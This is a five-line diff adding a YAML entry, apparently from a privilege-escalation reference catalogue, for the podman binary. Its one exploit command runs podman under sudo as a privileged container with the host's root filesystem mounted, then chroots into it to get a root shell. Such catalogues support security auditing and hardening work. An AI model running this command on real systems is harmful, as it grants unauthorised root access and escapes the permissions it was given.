@@ -1,0 +1,5 @@
+name: podman
+binary_path: /usr/bin/podman
+exploit_cmds:
+- sudo /usr/bin/podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt
+  /bin/sh
